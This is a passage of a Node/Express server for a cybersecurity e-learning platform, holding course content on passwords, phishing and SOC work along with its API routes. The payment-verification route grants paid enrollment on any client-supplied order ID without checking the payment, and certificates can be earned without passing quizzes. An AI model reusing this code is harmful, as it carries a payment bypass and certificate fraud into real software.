        <ul><li><strong>Bitwarden</strong> — Free, open source, self-hostable</li><li><strong>1Password</strong> — Best UX, paid</li><li><strong>KeePassXC</strong> — Fully offline, free</li></ul>
        <div class="info-box">🛡 <strong>Rule:</strong> Never reuse passwords. A breach on one site should not compromise all your accounts.</div>`,
        quiz:[{q:'What percentage of breaches involve weak passwords?',options:['45%','61%','81%','99%'],correct:2},{q:'Which is the strongest password?',options:['Password123!','MyName1990','K#9mP$vL2@nQ','qwerty12345'],correct:2}]},
      {id:'l2',title:'Recognizing Phishing',titleAr:'التعرف على التصيد الإلكتروني',duration:'30 min',type:'reading',free:true,
        content:`<h2>How to Spot Phishing</h2>
        <p>Phishing attacks have become sophisticated. Here's how to identify them:</p>
        <h3>Red Flags to Watch For</h3>
        <div class="code-block">❌ Suspicious sender: support@amaz0n-verify.com
           (note: zero instead of 'o')
❌ Urgency: "Your account will be DELETED in 24 hours!"
❌ Generic greeting: "Dear Customer" (not your name)
❌ Suspicious link: hover shows different URL than displayed
❌ Requests credentials or payment via email</div>
        <h3>The Golden Rule</h3>
        <p>If an email asks you to click a link and log in — <strong>go directly to the website instead</strong>. Never click links in suspicious emails.</p>
        <div class="info-box">📚 <strong>Source:</strong> CISA Stop.Think.Connect, Google Phishing Quiz</div>`,
        quiz:[{q:'What is the safest response to an email saying "your account will be deleted — log in now"?',options:['Click the link immediately','Reply to verify','Go directly to the website in a new browser tab','Forward to friends'],correct:2}]},
      {id:'l3',title:'Online Privacy',titleAr:'الخصوصية الرقمية',duration:'30 min',type:'reading',free:true,
        content:`<h2>Protecting Your Online Privacy</h2>
        <h3>Browser Security</h3>
        <p>Use privacy-focused settings and extensions:</p>
        <ul><li><strong>uBlock Origin</strong> — Blocks ads and trackers</li><li><strong>HTTPS Everywhere</strong> — Forces encrypted connections</li><li>Use <strong>Firefox</strong> or <strong>Brave</strong> for better privacy</li></ul>
        <h3>Social Media Hygiene</h3>
        <p>Oversharing on social media enables social engineering attacks. Attackers use your public posts to craft targeted phishing messages.</p>
        <div class="info-box">🔒 <strong>Quick Wins:</strong><br>✅ Enable 2FA on all accounts<br>✅ Review app permissions regularly<br>✅ Use a VPN on public WiFi<br>✅ Keep software updated</div>`,
        quiz:[{q:'Which browser extension blocks trackers and ads?',options:['LastPass','uBlock Origin','Grammarly','Honey'],correct:1}]},
      {id:'l4',title:'Final Exam',titleAr:'الاختبار النهائي',duration:'20 min',type:'quiz',free:false,
        content:`<h2>Security Awareness — Final Exam</h2><p>You need <strong>70%</strong> to pass.</p>`,
        quiz:[
          {q:'What tool is recommended for managing passwords securely?',options:['Browser saved passwords','Sticky notes','Password Manager (Bitwarden/1Password)','Email drafts'],correct:2},
          {q:'What should you do if an email asks you to log in urgently?',options:['Click the link and login','Navigate directly to the website','Reply and ask if it is real','Ignore all emails'],correct:1},
          {q:'What percentage of breaches involve weak/stolen passwords?',options:['45%','81%','55%','90%'],correct:1},
          {q:'Which of these is a sign of phishing?',options:['Email from a known address','Personalized greeting with your full name','Urgent language and suspicious links','Plain text with no links'],correct:2}
        ]}
    ]
  },
  {
    _id:'c6', title:'SOC Analyst Fundamentals', titleAr:'أساسيات محلل SOC',
    description:'Everything you need to work as a SOC Analyst: SIEM tools, log analysis, incident response, threat hunting, and real-world scenarios.',
    descriptionAr:'كل ما تحتاجه للعمل كـ SOC Analyst: SIEM، تحليل اللوغات، Incident Response، وتمارين حقيقية.',
    category:'cybersecurity', level:'intermediate', price:39, isFree:false, duration:'14 hours', rating:4.9,
    studentsCount:910, instructor:'CyberSafe Team', badge:'New',
    objectives:['Understand SOC operations','Use SIEM tools effectively','Analyze security logs','Respond to incidents'],
    lessons:[
      {id:'l1',title:'SOC Operations & Structure',titleAr:'عمليات وهيكل SOC',duration:'30 min',type:'reading',free:true,
        content:`<h2>Security Operations Center (SOC)</h2>
        <p>A SOC is a centralized unit that monitors, detects, analyzes, and responds to cybersecurity threats 24/7.</p>
        <h3>SOC Analyst Tiers</h3>
        <div class="phases"><div class="phase-item"><div class="phase-num">L1</div><div><strong>Triage Analyst</strong><p>Monitor alerts, initial triage, escalate to L2. Entry level.</p></div></div><div class="phase-item"><div class="phase-num">L2</div><div><strong>Incident Responder</strong><p>Deep investigation, correlation, incident handling.</p></div></div><div class="phase-item"><div class="phase-num">L3</div><div><strong>Threat Hunter</strong><p>Proactive threat hunting, forensics, advanced malware analysis.</p></div></div></div>
        <h3>Key SOC Tools</h3>
        <ul><li><strong>SIEM:</strong> Splunk, IBM QRadar, Microsoft Sentinel</li><li><strong>EDR:</strong> CrowdStrike, SentinelOne, Microsoft Defender</li><li><strong>SOAR:</strong> Palo Alto XSOAR, Splunk SOAR</li><li><strong>Threat Intel:</strong> MISP, VirusTotal, Shodan</li></ul>
        <div class="info-box">📚 <strong>Source:</strong> SANS SOC Survey, Splunk State of Security 2023</div>`,
        quiz:[{q:'What does a Tier 1 SOC analyst primarily do?',options:['Write malware','Monitor alerts and perform initial triage','Lead incident response','Manage firewalls'],correct:1}]},
      {id:'l2',title:'Log Analysis & SIEM',titleAr:'تحليل السجلات والـ SIEM',duration:'75 min',type:'reading',free:false,
        content:`<h2>Log Analysis & SIEM</h2>
        <p>Logs are the foundation of security monitoring. A typical enterprise generates billions of log events per day.</p>
        <h3>Critical Log Sources</h3>
        <ul><li><strong>Windows Event Logs:</strong> Event ID 4624 (Logon), 4625 (Failed Logon), 4688 (Process Creation)</li><li><strong>Firewall Logs:</strong> Allowed/denied connections, source/destination IPs</li><li><strong>DNS Logs:</strong> Domain queries — can reveal C2 communication</li><li><strong>Web Server Logs:</strong> Apache/Nginx access logs</li></ul>
        <h3>Splunk SPL Examples</h3>
        <div class="code-block"># Find failed logons
index=wineventlog EventCode=4625
| stats count by src_ip, user
| where count > 10
| sort -count

# Detect port scanning
index=firewall action=denied
| stats dc(dest_port) as ports by src_ip
| where ports > 100</div>
        <div class="info-box">📚 <strong>Source:</strong> Splunk Security Essentials, Microsoft Sentinel Documentation</div>`,
        quiz:[{q:'Which Windows Event ID indicates a failed logon?',options:['4624','4625','4688','4720'],correct:1}]},
      {id:'l3',title:'Incident Response',titleAr:'الاستجابة للحوادث',duration:'80 min',type:'reading',free:false,
        content:`<h2>Incident Response (IR)</h2>
        <p>Incident Response is a structured approach to handle security breaches. The industry-standard framework is NIST SP 800-61.</p>
        <div class="phases"><div class="phase-item"><div class="phase-num">1</div><div><strong>Preparation</strong><p>IR plan, tools, team training before incidents occur.</p></div></div><div class="phase-item"><div class="phase-num">2</div><div><strong>Detection & Analysis</strong><p>Identify indicators of compromise (IoCs), severity assessment.</p></div></div><div class="phase-item"><div class="phase-num">3</div><div><strong>Containment</strong><p>Isolate affected systems to prevent spread.</p></div></div><div class="phase-item"><div class="phase-num">4</div><div><strong>Eradication</strong><p>Remove malware, close vulnerabilities, patch systems.</p></div></div><div class="phase-item"><div class="phase-num">5</div><div><strong>Recovery</strong><p>Restore systems, monitor for recurrence.</p></div></div><div class="phase-item"><div class="phase-num">6</div><div><strong>Lessons Learned</strong><p>Post-incident review, improve defenses.</p></div></div></div>
        <div class="info-box">📚 <strong>Source:</strong> NIST SP 800-61 Rev 2, SANS Incident Handler's Handbook</div>`,
        quiz:[{q:'What is the NIST IR framework\'s first phase?',options:['Detection','Containment','Preparation','Recovery'],correct:2}]},
      {id:'l4',title:'Final Exam',titleAr:'الاختبار النهائي',duration:'45 min',type:'quiz',free:false,
        content:`<h2>SOC Analyst — Final Exam</h2><p>You need <strong>70%</strong> to pass.</p>`,
        quiz:[
          {q:'What does SIEM stand for?',options:['Security Information and Event Management','System Intrusion and Error Monitoring','Security Intelligence and Endpoint Management','Secure Infrastructure and Email Management'],correct:0},
          {q:'Which Windows Event ID logs successful logons?',options:['4625','4688','4624','4720'],correct:2},
          {q:'What is the first phase of NIST Incident Response?',options:['Detection','Preparation','Containment','Eradication'],correct:1},
          {q:'Which tool is used for SIEM?',options:['Nmap','Splunk','Metasploit','Burp Suite'],correct:1},
          {q:'What does a Tier 3 SOC analyst do?',options:['Monitor basic alerts','Escalate tickets','Proactive threat hunting and forensics','Manage network switches'],correct:2}
        ]}
    ]
  }
];

// AUTH Middleware
function auth(req, res, next) {
  const h = req.headers.authorization;
  if (!h || !h.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
  try { req.user = jwt.verify(h.split(' ')[1], SECRET); next(); }
  catch { res.status(401).json({ error: 'Session expired. Please log in again.' }); }
}
function optAuth(req, res, next) {
  const h = req.headers.authorization;
  if (h && h.startsWith('Bearer ')) try { req.user = jwt.verify(h.split(' ')[1], SECRET); } catch {}
  next();
}

// AUTH ROUTES
app.post('/api/auth/register', async (req, res) => {
  try {
    const { name, email, password } = req.body;
    if (!name || !email || !password) return res.status(400).json({ error: 'All fields are required' });
    if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters' });
    if (await db.users.findOne({ email: email.toLowerCase() })) return res.status(400).json({ error: 'Email already registered' });
    const user = await db.users.insert({ name, email: email.toLowerCase(), password: await bcrypt.hash(password, 10), role: 'student', createdAt: new Date().toISOString(), avatar: name.charAt(0).toUpperCase() });
    const token = jwt.sign({ id: user._id, email: user.email, role: user.role }, SECRET, { expiresIn: '7d' });
    welcomeEmail(name, email.toLowerCase());
    res.json({ token, user: { id: user._id, name: user.name, email: user.email, role: user.role, avatar: user.avatar } });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await db.users.findOne({ email: email?.toLowerCase() });
    if (!user || !await bcrypt.compare(password, user.password)) return res.status(400).json({ error: 'Invalid email or password' });
    const token = jwt.sign({ id: user._id, email: user.email, role: user.role }, SECRET, { expiresIn: '7d' });
    res.json({ token, user: { id: user._id, name: user.name, email: user.email, role: user.role, avatar: user.avatar } });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.get('/api/auth/me', auth, async (req, res) => {
  const user = await db.users.findOne({ _id: req.user.id });
  if (!user) return res.status(404).json({ error: 'User not found' });
  const enrollments = await db.enrollments.find({ userId: user._id });
  const certificates = await db.certificates.find({ userId: user._id });
  res.json({ user: { id: user._id, name: user.name, email: user.email, role: user.role, avatar: user.avatar, createdAt: user.createdAt }, enrollments: enrollments.map(e => e.courseId), certificates });
});

// COURSES ROUTES
app.get('/api/courses', optAuth, (req, res) => {
  let courses = COURSES.map(c => ({ ...c, lessons: c.lessons.map(l => ({ ...l, content: undefined, quiz: undefined })) }));
  const { category, level, search } = req.query;
  if (category && category !== 'all') courses = courses.filter(c => c.category === category);
  if (level && level !== 'all') courses = courses.filter(c => c.level === level);
  if (search) { const s = search.toLowerCase(); courses = courses.filter(c => c.title.toLowerCase().includes(s) || c.description.toLowerCase().includes(s)); }
  res.json(courses);
});

app.get('/api/courses/:id', optAuth, async (req, res) => {
  const course = COURSES.find(c => c._id === req.params.id);
  if (!course) return res.status(404).json({ error: 'Course not found' });
  let enrolled = false;
  if (req.user) enrolled = !!(await db.enrollments.findOne({ userId: req.user.id, courseId: course._id }));
  const safeLesson = course.lessons.map(l => ({ ...l, content: undefined, quiz: undefined }));
  res.json({ ...course, lessons: safeLesson, enrolled });
});

app.get('/api/courses/:id/lesson/:lessonId', auth, async (req, res) => {
  const course = COURSES.find(c => c._id === req.params.id);
  if (!course) return res.status(404).json({ error: 'Course not found' });
  const lesson = course.lessons.find(l => l.id === req.params.lessonId);
  if (!lesson) return res.status(404).json({ error: 'Lesson not found' });
  const enrolled = !!(await db.enrollments.findOne({ userId: req.user.id, courseId: course._id }));
  if (!lesson.free && !enrolled) return res.status(403).json({ error: 'Enroll in this course to access this lesson' });
  res.json(lesson);
});

app.post('/api/courses/:id/enroll', auth, async (req, res) => {
  const course = COURSES.find(c => c._id === req.params.id);
  if (!course) return res.status(404).json({ error: 'Course not found' });
  if (await db.enrollments.findOne({ userId: req.user.id, courseId: course._id })) return res.json({ message: 'Already enrolled' });
  if (!course.isFree) return res.status(402).json({ error: 'This is a paid course', price: course.price });
  await db.enrollments.insert({ userId: req.user.id, courseId: course._id, enrolledAt: new Date().toISOString(), progress: 0 });
  res.json({ message: 'Successfully enrolled!' });
});

app.post('/api/payment/verify', auth, async (req, res) => {
  try {
    const { courseId, orderId } = req.body;
    const course = COURSES.find(c => c._id === courseId);
    if (!course) return res.status(404).json({ error: 'Course not found' });
    const existing = await db.payments.findOne({ userId: req.user.id, courseId, orderId });
    if (!existing) await db.payments.insert({ userId: req.user.id, courseId, orderId, amount: course.price, paidAt: new Date().toISOString() });
    const enrolled = await db.enrollments.findOne({ userId: req.user.id, courseId });
    if (!enrolled) await db.enrollments.insert({ userId: req.user.id, courseId, enrolledAt: new Date().toISOString(), progress: 0 });
    res.json({ message: 'Payment verified! You are now enrolled.' });
  } catch (e) { res.status(500).json({ error: 'Payment verification failed' }); }
});

app.post('/api/courses/:courseId/progress', auth, async (req, res) => {
  try {
    const { lessonId, completed } = req.body;
    const { courseId } = req.params;
    const enrollment = await db.enrollments.findOne({ userId: req.user.id, courseId });
    if (!enrollment) return res.status(403).json({ error: 'Not enrolled in this course' });
    const existing = await db.progress.findOne({ userId: req.user.id, courseId, lessonId });
    if (!existing) await db.progress.insert({ userId: req.user.id, courseId, lessonId, completed, completedAt: new Date().toISOString() });
    else await db.progress.update({ _id: existing._id }, { $set: { completed } });
    const course = COURSES.find(c => c._id === courseId);
    const totalLessons = course.lessons.length;
    const completedCount = await db.progress.count({ userId: req.user.id, courseId, completed: true });
    const progressPct = Math.round((completedCount / totalLessons) * 100);
    await db.enrollments.update({ userId: req.user.id, courseId }, { $set: { progress: progressPct } });
    if (progressPct === 100) {
      const certExists = await db.certificates.findOne({ userId: req.user.id, courseId });
      if (!certExists) {
        const certId = `CSA-${Date.now().toString(36).toUpperCase()}`;
        const user = await db.users.findOne({ _id: req.user.id });
        await db.certificates.insert({ userId: req.user.id, courseId, courseTitle: course.title, userName: user.name, issuedAt: new Date().toISOString(), certId });
        courseCompletionEmail(user.name, user.email, course.title, certId);
      }
    }
    res.json({ progress: progressPct, completed: completedCount });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.get('/api/courses/:courseId/my-progress', auth, async (req, res) => {
  const { courseId } = req.params;
  const progress = await db.progress.find({ userId: req.user.id, courseId });
  const enrollment = await db.enrollments.findOne({ userId: req.user.id, courseId });
  res.json({ lessons: progress, overall: enrollment?.progress || 0 });
});

app.get('/api/config/paypal', (req, res) => res.json({ clientId: PAYPAL_CLIENT_ID }));
app.get('/api/health', (req, res) => res.json({ status: 'ok', platform: 'CyberSafe v2.0' }));

app.use(express.static(__dirname));
app.use((req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.listen(PORT, () => console.log(`🛡 CyberSafe running on port ${PORT}`));
